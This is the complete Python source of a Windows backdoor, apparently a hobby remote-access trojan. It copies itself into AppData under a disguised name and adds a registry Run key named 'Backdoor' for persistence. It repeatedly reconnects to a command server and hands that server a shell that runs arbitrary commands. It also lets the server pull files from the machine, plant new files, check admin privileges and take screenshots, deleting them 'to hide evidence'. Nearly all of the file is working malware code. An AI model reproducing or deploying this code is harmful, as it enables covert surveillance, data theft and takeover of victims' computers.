import socket
import subprocess
import os
import ctypes
import sys
import shutil
import time
from PIL import ImageGrab
import tempfile

# initial setup
def initiate():
    registry()
    tuneConnection()

# used to attempt to reconnect to c2 server every 20 seconds
def tuneConnection():

    # create the socket
    mySocket = socket.socket()

    while True:
        time.sleep(20)
        try:
            # attempt to connect to the command server
            mySocket.connect(('0.0.0.0', 8080))

            # start a new shell using the connection
            shell(mySocket)

        except:
            tuneConnection()

# registry persistence
def registry():
    # define filepath
    location = os.environ['appdata']+'\\windows32.exe'

    # checks to see if the path already exists or not
    if not os.path.exists(location):
        # if not, copy the executable to the appdata folder
        shutil.copyfile(sys.executable, location)

        # add an entry for the executable as a startup app in the registry
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "'
                        + location + '"', shell=True)

# allows the command server to grab files from the victim's machine
def letGrab(mySocket, path):

    # check to see if the requested file path exists
    if os.path.exists(path):

        # if it does, open the file and begin crafting a packet of the file data
        f = open(path, 'rb')
        packet = f.read(5000)

        # as long as the crafted packets are not empty, send the crafted packet and create a new one
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)

        # when the crafted packet is empty, encode and send the DONE flag to the command server to let it know that the file has been fully sent
        mySocket.send('DONE'.encode())

    # send a message if the requested file cannot be found
    else:
        mySocket.send('File not found'.encode())

# allows the command server to send files to the victim's machine
def letSend(mySocket, path, fileName):

    # check to see if the filepath is valid
    if os.path.exists(path):

        # open or create a new file with the requested path and name
        f = open(path + fileName, 'ab')

        while True:
            # store the bits received from the command server into a packet
            bits = mySocket.recv(5000)

            # check to see if the DONE flag is present
            if bits.endswith('DONE'.encode()):

                # write those last received bits without the word DONE
                f.write(bits[:-4])

                # end the loop
                f.close()
                break
            
            # do not transfer if the file cannot be found
            if 'File not found'.encode() in bits:
                break

            # write the packet to the file
            f.write(bits)

# allows for the command server to check the privilege level that the client is currently running on
def checkUserLevel():
    try:
        # IsUserAnAdmin() returns a bool as true if we have admin privileges
        is_admin = ctypes.WinDLL('Shell32').IsUserAnAdmin()
        if is_admin:
            return "[+] Admin privileges acquired."

        else:
            return "[!!] No admin privileges!"

    except:
        return "[!!] Unable to determine privilege level."

# allows for the transfer of screenshots
# s variable is the socket
def transfer(s, path):
    
    # check to see if the path exists
    if os.path.exists(path):

        # open the path and begin reading and crafting packets
        f = open(path, 'rb')
        packet = f.read(5000)

        # as long as the packet is not empty, send the packet and craft the next one
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        
        # otherwise close the file and send the DONE flag
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found.'.encode())

# allows for the command server to execute commands
def shell(mySocket):

    while True:
        # recieve the command from the c2 server
        command = mySocket.recv(5000)

        # handle input from the commands and carry out the actions requested
        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'grab' in command.decode():
            # grab and send commands use '*' as the delimiter
            grab, path = command.decode().split('*')
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        elif 'send' in command.decode():
            send, path, fileName = command.decode().split('*')
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        elif 'checkUserLevel' in command.decode():
            result = checkUserLevel()
            mySocket.send(result.encode())

        elif 'screencap' in command.decode():
            # create a temp dir
            dirpath = tempfile.mkdtemp()

            # grab() method takes a snapshot
            # save() method saves the snapshot in the temp dir
            ImageGrab.grab().save(dirpath + r"\img.jpg", "JPEG")

            # transfer the screenshot
            transfer(mySocket, dirpath + r"\img.jpg")

            # delete the local screenshot to hide evidence
            shutil.rmtree(dirpath)

        # allows for directory traversal
        elif 'cd' in command.decode():
            try:
                # split the command after the first space (cd-> <-C:\Users\Desktop)
                code, directory = command.decode().split(' ', 1)

                # change the current directory to the one requested
                os.chdir(directory)

                # inform the server of the change
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                mySocket.send(informToServer.encode())

        # standard error and command handling for other implicitly supported commands (whoami, dir, etc...)
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def main():
    initiate()

main()


